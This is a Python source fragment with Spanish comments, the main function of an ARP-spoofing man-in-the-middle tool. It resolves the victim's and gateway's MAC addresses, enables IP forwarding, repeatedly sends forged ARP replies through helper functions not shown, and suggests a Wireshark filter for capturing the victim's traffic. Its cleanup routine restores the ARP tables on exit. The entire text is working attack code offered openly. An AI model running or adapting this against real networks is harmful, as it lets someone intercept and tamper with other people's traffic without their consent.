# ==============================================================
# FUNCION PRINCIPAL
# ==============================================================

def arp_mitm(iface: str, victim_ip: str, gateway_ip: str,
             interval: float = 2.0) -> None:
    """
    Ejecuta el ataque MitM ARP Spoofing.

    Args:
        iface      : Interfaz de red
        victim_ip  : IP de la victima
        gateway_ip : IP del gateway/router
        interval   : Segundos entre envios de paquetes ARP falsos
    """
    # Obtener MACs reales
    print(f"\n[*] Resolviendo MAC de la victima ({victim_ip})...")
    victim_mac = get_mac(victim_ip, iface)
    if not victim_mac:
        sys.exit(1)

    print(f"[*] Resolviendo MAC del gateway ({gateway_ip})...")
    gateway_mac = get_mac(gateway_ip, iface)
    if not gateway_mac:
        sys.exit(1)

    # MAC del atacante
    attacker_mac = get_if_hwaddr(iface)

    print_banner(iface, victim_ip, gateway_ip,
                 victim_mac, gateway_mac, attacker_mac)

    # Habilitar IP forwarding para reenviar trafico
    enable_ip_forwarding()

    # Manejador de senal para salida limpia
    packets_sent = [0]

    def signal_handler(sig, frame):
        print(f"\n[!] Deteniendo ataque. Paquetes enviados: {packets_sent[0]}")
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
        disable_ip_forwarding()
        print("\n[INFO] Para capturar trafico durante el ataque usar Wireshark:")
        print(f"       Filtro: arp.opcode == 2 or ip.addr == {victim_ip}")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    # Bucle principal de envenenamiento
    try:
        while True:
            poison_arp(victim_ip, victim_mac,
                       gateway_ip, gateway_mac, attacker_mac)
            packets_sent[0] += 2

            if packets_sent[0] % 20 == 0:
                print(f"[+] Paquetes ARP falsos enviados: {packets_sent[0]:6d} "
                      f"| {datetime.now().strftime('%H:%M:%S')}")

            time.sleep(interval)

    except Exception as e:
        print(f"\n[ERROR] {e}")
        restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
        disable_ip_forwarding()
        sys.exit(1)


